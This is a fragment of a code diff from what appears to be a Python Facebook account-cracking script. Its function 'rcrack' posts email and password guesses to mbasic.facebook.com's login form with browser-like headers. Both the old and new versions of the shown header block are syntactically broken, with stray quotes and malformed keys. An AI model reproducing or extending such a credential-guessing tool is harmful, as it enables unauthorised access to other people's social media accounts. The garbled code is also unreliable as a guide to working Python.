@@ -205,9 +205,9 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            headers = {'authority': 'mbasic.facebook.com',
-    ':method: GET
-    :path: /
+            'headers = {'authority': 'mbasic.facebook.com',
+    'method: GET
+    'path: /
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
     'cache-control': 'max-age=0',
